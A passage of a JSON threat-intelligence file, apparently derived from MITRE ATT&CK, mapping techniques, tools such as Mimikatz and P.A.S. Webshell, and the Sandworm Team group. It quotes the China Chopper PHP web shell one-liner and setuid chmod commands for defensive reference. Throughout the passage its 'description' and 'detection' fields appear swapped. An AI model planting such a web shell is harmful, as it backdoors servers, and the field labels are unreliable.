                "detection": "Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.\n\nThe SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1207",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Rogue Domain Controller",
                "chain_phase": "defense-evasion",
                "description": "Monitor and analyze network traffic associated with data replication (such as calls to DrsAddEntry, DrsReplicaAdd, and especially GetNCChanges) between DCs as well as to/from non DC hosts. (Citation: GitHub DCSYNCMonitor) (Citation: DCShadow Blog) DC replication will naturally take place every 15 minutes but can be triggered by an attacker or by legitimate urgent changes (ex: passwords). Also consider monitoring and alerting on the replication of AD objects (Audit Detailed Directory Service Replication Events 4928 and 4929). (Citation: DCShadow Blog)\n\nLeverage AD directory synchronization (DirSync) to monitor changes to directory state using AD replication cookies. (Citation: Microsoft DirSync) (Citation: ADDSecurity DCShadow Feb 2018)\n\nBaseline and periodically analyze the Configuration partition of the AD schema and alert on creation of nTDSDSA objects. (Citation: DCShadow Blog)\n\nInvestigate usage of Kerberos Service Principal Names (SPNs), especially those associated with services (beginning with “GC/”) by computers not present in the DC organizational unit (OU). The SPN associated with the Directory Replication Service (DRS) Remote Protocol interface (GUID E3514235–4B06–11D1-AB04–00C04FC2DCD2) can be set without logging. (Citation: ADDSecurity DCShadow Feb 2018) A rogue DC must authenticate as a service using these two SPNs for the replication process to successfully complete.",
                "detection": "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC.  Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\n\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. \n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors).  The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform SID-History Injection and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1098",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Account Manipulation",
                "chain_phase": "persistence",
                "description": "Collect events that correlate with changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728 and 4670.(Citation: Microsoft User Modified Event)(Citation: Microsoft Security Event 4670)(Citation: Microsoft Security Event 4670) Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems. Especially flag events where the subject and target accounts differ(Citation: InsiderThreat ChangeNTLM July 2017) or that include additional flags such as changing a password without knowledge of the old password.(Citation: GitHub Mimikatz Issue 92 June 2017)\n\nMonitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.\n\nMonitor for unusual permissions changes that may indicate excessively broad permissions being granted to compromised accounts.",
                "detection": "Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace"
                ]
            }
        },
        {
            "id": "S0002",
            "type": "tool",
            "attributes": {
                "name": "Mimikatz",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Mimikatz is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1555.004": "Windows Credential Manager",
                    "T1003.004": "LSA Secrets",
                    "T1134.005": "SID-History Injection",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1558.002": "Silver Ticket",
                    "T1558.001": "Golden Ticket",
                    "T1555": "Credentials from Password Stores",
                    "T1003.006": "DCSync",
                    "T1003.002": "Security Account Manager",
                    "T1003.001": "LSASS Memory",
                    "T1552.004": "Private Keys",
                    "T1550.003": "Pass the Ticket",
                    "T1550.002": "Pass the Hash",
                    "T1547.005": "Security Support Provider",
                    "T1207": "Rogue Domain Controller",
                    "T1098": "Account Manipulation"
                }
            },
            "val": 16
        },
        {
            "id": "G0034",
            "type": "group",
            "attributes": {
                "val": 10,
                "name": "Sandworm Team",
                "aliases": [
                    "ELECTRUM",
                    "Telebots",
                    "IRON VIKING",
                    "BlackEnergy (Group)",
                    "Quedagh",
                    "VOODOO BEAR"
                ],
                "description": "Sandworm Team is a destructive threat group that has been attributed to Russia's General Staff Main Intelligence Directorate (GRU) Main Center for Special Technologies (GTsST) military unit 74455. This group has been active since at least 2009.\n\nIn October 2020, the US indicted six GRU Unit 74455 officers associated with Sandworm Team for the following cyber operations: the 2015 and 2016 attacks against Ukrainian electrical companies and government organizations, the 2017 worldwide NotPetya attack, targeting of the 2017 French presidential campaign, the 2018 Olympic Destroyer attack against the Winter Olympic Games, the 2018 operation against the Organisation for the Prohibition of Chemical Weapons, and attacks against the country of Georgia in 2018 and 2019. Some of these were conducted with the assistance of GRU Unit 26165, which is also referred to as APT28.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0598": "P.A.S. Webshell",
                    "S0401": "Exaramel for Linux",
                    "S0368": "NotPetya",
                    "S0365": "Olympic Destroyer",
                    "S0343": "Exaramel for Windows",
                    "S0231": "Invoke-PSImage",
                    "S0089": "BlackEnergy",
                    "S0555": "CHEMISTGAMES",
                    "S1004": "Industroyer",
                    "S1005": "Killdisk"
                },
                "techniques": {
                    "T1588.006": "Vulnerabilities",
                    "T1598.003": "Spearphishing Link",
                    "T1595.002": "Vulnerability Scanning",
                    "T1594": "Search Victim-Owned Websites",
                    "T1593": "Search Open Websites/Domains",
                    "T1592.002": "Software",
                    "T1591.002": "Business Relationships",
                    "T1590.001": "Domain Properties",
                    "T1589.003": "Employee Names",
                    "T1589.002": "Email Addresses",
                    "T1588.002": "Tool",
                    "T1587.001": "Malware",
                    "T1585.002": "Email Accounts",
                    "T1585.001": "Social Media Accounts",
                    "T1583.004": "Server",
                    "T1583.001": "Domains",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1102.002": "Bidirectional Communication",
                    "T1571": "Non-Standard Port",
                    "T1078.002": "Domain Accounts",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1195.002": "Compromise Software Supply Chain",
                    "T1059.005": "Visual Basic",
                    "T1059.001": "PowerShell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1087.003": "Email Account",
                    "T1087.002": "Domain Account",
                    "T1561.002": "Disk Structure Wipe",
                    "T1491.002": "External Defacement",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1056.001": "Keylogging",
                    "T1003.001": "LSASS Memory",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1070.004": "File Deletion",
                    "T1218.011": "Rundll32",
                    "T1505.003": "Web Shell",
                    "T1499": "Endpoint Denial of Service",
                    "T1485": "Data Destruction",
                    "T1219": "Remote Access Software",
                    "T1203": "Exploitation for Client Execution",
                    "T1199": "Trusted Relationship",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1133": "External Remote Services",
                    "T1105": "Ingress Tool Transfer",
                    "T1090": "Proxy",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1078": "Valid Accounts",
                    "T1049": "System Network Connections Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1040": "Network Sniffing",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1005": "Data from Local System",
                    "T0886": "Remote Services",
                    "T0822": "External Remote Services",
                    "T0859": "Valid Accounts",
                    "T0819": "Exploit Public-Facing Application",
                    "T0823": "Graphical User Interface",
                    "T0857": "System Firmware",
                    "T0803": "Block Command Message",
                    "T0816": "Device Restart/Shutdown",
                    "T0865": "Spearphishing Attachment",
                    "T0804": "Block Reporting Message",
                    "T0855": "Unauthorized Command Message"
                }
            }
        },
        {
            "id": "T1110.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Password Guessing",
                "chain_phase": "credential-access",
                "description": "Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.",
                "detection": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. \n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace",
                    "Containers"
                ]
            }
        },
        {
            "id": "T1222.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Linux and Mac File and Directory Permissions Modification",
                "chain_phase": "defense-evasion",
                "description": "Monitor and investigate attempts to modify ACLs and file/directory ownership. Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.\n\nConsider enabling file/directory permission change auditing on folders containing key binary/configuration files.",
                "detection": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Unix Shell Configuration Modification or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.",
                "is_subtype": true,
                "platforms": [
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1070.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "File Deletion",
                "chain_phase": "defense-evasion",
                "description": "It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.",
                "detection": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native cmd functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1505.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Web Shell",
                "chain_phase": "persistence",
                "description": "Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013) \n\n<code>&lt;?php @eval($_POST['password']);&gt;</code>\n\nNevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running cmd.exe or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells) ",
                "detection": "Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (ex: China Chopper Web shell client).",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1518",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Software Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to Exploitation for Privilege Escalation.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace"
                ]
            }
        },
        {
            "id": "T1213",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Data from Information Repositories",
                "chain_phase": "collection",
                "description": "As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should not generally used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.\n\nThe user access logging within Microsoft's SharePoint can be configured to report access to certain pages and documents. (Citation: Microsoft SharePoint Logging) The user access logging within Atlassian's Confluence can also be configured to report access to certain pages and documents through AccessLogFilter. (Citation: Atlassian Confluence Logging) Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities.",
                "detection": "Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.\n\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n\nInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include Sharepoint, Confluence, and enterprise databases such as SQL Server.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS",
                    "SaaS",
                    "Office 365",
                    "Google Workspace"
                ]
            }
        },
        {
            "id": "T1140",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Deobfuscate/Decode Files or Information",
                "chain_phase": "defense-evasion",
                "description": "Detecting the action of deobfuscating or decoding files or information may be difficult depending on the implementation. If the functionality is contained within malware and uses the Windows API, then attempting to detect malicious behavior before or after the action may yield better results than attempting to perform analysis on loaded libraries or API calls. If scripts are used, then collecting the scripts for analysis may be necessary. Perform process and command-line monitoring to detect potentially malicious behavior related to scripts and system utilities such as [certutil](https://attack.mitre.org/software/S0160).\n\nMonitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.",
                "detection": "Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file.  Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. \n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1059",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Command and Scripting Interpreter",
                "chain_phase": "execution",
                "description": "Command-line and scripting activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools. Also monitor for loading of modules associated with specific languages.\n\nIf scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.",
                "detection": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\n\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Network"
                ]
            }
        },
        {
            "id": "T1027",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Obfuscated Files or Information",
                "chain_phase": "defense-evasion",
                "description": "Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system). \n\nFlag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like '''^''' and '''\"'''. Windows' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files/payloads. (Citation: GitHub Revoke-Obfuscation) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: GitHub Office-Crackros Aug 2016) \n\nObfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection. \n\nThe first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network. ",
                "detection": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also used compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \n\nAdversaries may also obfuscate commands executed from payloads or directly via a Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0598",
            "type": "tool",
            "attributes": {
                "name": "P.A.S. Webshell",
                "aliases": [
                    "Fobushell"
                ],
                "labels": [
                    "malware"
                ],
                "description": "P.A.S. Webshell is a publicly available multifunctional PHP webshell in use since at least 2016 that provides remote access and execution on target web servers.",
                "platforms": [
                    "Linux",
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1087.001": "Local Account",
                    "T1110.001": "Password Guessing",
                    "T1222.002": "Linux and Mac File and Directory Permissions Modification",
                    "T1070.004": "File Deletion",
                    "T1505.003": "Web Shell",
                    "T1518": "Software Discovery",
                    "T1213": "Data from Information Repositories",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1059": "Command and Scripting Interpreter",
                    "T1046": "Network Service Scanning",
                    "T1027": "Obfuscated Files or Information",
                    "T1005": "Data from Local System"
                }
            },
            "val": 15
        },
        {
            "id": "T1059.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Unix Shell",
                "chain_phase": "execution",
                "description": "Unix shell usage may be common on administrator, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script. ",
                "detection": "Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution. Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.\n\nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.",
                "is_subtype": true,
                "platforms": [
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1548.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Setuid and Setgid",
                "chain_phase": "privilege-escalation",
                "description": "Monitor the file system for files that have the setuid or setgid bits set. Monitor for execution of utilities, like chmod, and their command-line arguments to look for setuid or setguid bits being set.",
                "detection": "An adversary may perform shell escapes or exploit vulnerabilities in an application with the setsuid or setgid bits to get code running in a different user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application, the application will run with the privileges of the owning user or group respectively. . Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges.\n\nInstead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via <code>ls -l</code>. The <code>chmod</code> program can set these bits with via bitmasking, <code>chmod 4777 file</code> or via shorthand naming, <code>chmod u+s file</code>.\n\nAdversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future..",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1543",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Create or Modify System Process",
                "chain_phase": "persistence",
                "description": "Monitor for changes to system processes that do not correlate with known software, patch cycles, etc., including by comparing results against a trusted system baseline. New, benign system processes may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.  \n\nCommand-line invocation of tools capable of modifying services may be unusual, depending on how systems are typically used in a particular environment. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. \n\nMonitor for changes to files associated with system-level processes.",
                "detection": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.  On macOS, launchd processes known as Launch Daemon and Launch Agent are run to finish system initialization and load user specific parameters. \n\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \n\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges. .",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1053.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Cron",
                "chain_phase": "execution",
                "description": "Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc.  \n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement. ",
                "detection": "Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code. The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.\n\nAn adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for persistence. <code>cron</code> can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1008",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Fallback Channels",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
                "detection": "Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "S0401",
            "type": "tool",
            "attributes": {
                "name": "Exaramel for Linux",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Exaramel for Linux is a backdoor written in the Go Programming Language and compiled as a 64-bit ELF binary. The Windows version is tracked separately under Exaramel for Windows.",
                "platforms": [
                    "Linux"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.004": "Unix Shell",
                    "T1070.004": "File Deletion",
                    "T1548.001": "Setuid and Setgid",
                    "T1543.002": "Systemd Service",
                    "T1543": "Create or Modify System Process",
                    "T1053.003": "Cron",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1008": "Fallback Channels"
                }
            },
            "val": 12
        },
        {
            "id": "T1078.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Local Accounts",
                "chain_phase": "defense-evasion",
